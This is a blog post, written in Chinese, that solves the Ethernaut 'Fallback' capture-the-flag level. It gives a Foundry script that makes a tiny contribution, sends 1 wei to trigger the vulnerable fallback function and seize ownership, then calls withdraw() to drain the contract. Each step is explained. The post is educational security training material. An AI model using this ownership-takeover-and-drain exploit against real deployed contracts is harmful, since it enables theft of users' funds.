---
layout: post
title: "Ethernaut-Fallback"
date: 2024-08-29 12:00:00 +0800
author: [001]
categories: [Ethernaut]
tags: [CTF]
---

## POC

```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
import {Fallback} from "../../challenge-contracts/01-Fallback.sol";

contract FallbackSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");
    
    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // YOUR SOLUTION HERE
        Fallback(payable(challengeInstance)).contribute{value:0.0001 ether}();
        (bool success, ) = payable(challengeInstance).call{value:1 wei}("");
        require(success, "Transfer failed.");
        Fallback(payable(challengeInstance)).withdraw();

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(1));
    }
}
```
## 程式碼區段說明


### 套件與合約的引入
```
import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";
import {Fallback} from "../../challenge-contracts/01-Fallback.sol";
```

* Script 和 console2 是 Foundry 提供的標準腳本模組，用來執行與輸出調試訊息。
* EthernautHelper 是一個輔助模組，用來與 Ethernaut 挑戰互動。這通常包含一些方法來創建關卡實例或提交解題結果。
* Fallback 是 Ethernaut 挑戰中的合約，這是一個需要玩家奪取合約控制權並提取資金的挑戰。

### 常量和私鑰

```
address constant LEVEL_ADDRESS = 0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB;
uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");
```

*  LEVEL_ADDRESS 是 Ethernaut "Fallback" 挑戰合約的地址。
*  heroPrivateKey 是從環境變數中讀取的玩家私鑰，用來廣播交易。



### run 函數

```
function run() public {
    vm.startBroadcast(heroPrivateKey);
    address challengeInstance = createInstance(LEVEL_ADDRESS);
```

* vm.startBroadcast(heroPrivateKey) 會以指定的私鑰開始交易廣播，允許後續執行合約互動。
* createInstance(LEVEL_ADDRESS) 創建一個 Ethernaut 關卡實例，這將返回挑戰合約的地址。


### 解決方案的實施


```
    Fallback(payable(challengeInstance)).contribute{value:0.0001 ether}();
    (bool success, ) = payable(challengeInstance).call{value:1 wei}("");
    require(success, "Transfer failed.");
    Fallback(payable(challengeInstance)).withdraw();
```

* Fallback(payable(challengeInstance)).contribute{value:0.0001 ether}()：向挑戰合約的 contribute() 函數發送 0.0001 Ether 進行貢獻，這一步是取得某些權限的先決條件。
* (bool success, ) = payable(challengeInstance).call{value:1 wei}("");：這行是向合約發送 1 wei 的 Ether，觸發該合約的 fallback 函數。這個操作會讓玩家成為合約的擁有者，因為挑戰合約中的 fallback 函數允許如果有人直接發送資金給合約且貢獻大於 0，則會變更合約所有權。
* Fallback(payable(challengeInstance)).withdraw();：這行呼叫 withdraw() 函數，提取合約中的所有資金。

### 提交

```
    bool levelSuccess = submitInstance(challengeInstance);
    require(levelSuccess, "Challenge not passed yet");
    vm.stopBroadcast();
    console2.log(successMessage(1));
}
```

* submitInstance(challengeInstance) 用來提交挑戰結果，這是 Ethernaut 平台所要求的步驟。
* 成功後，透過 console2.log(successMessage(1)); 顯示成功訊息。


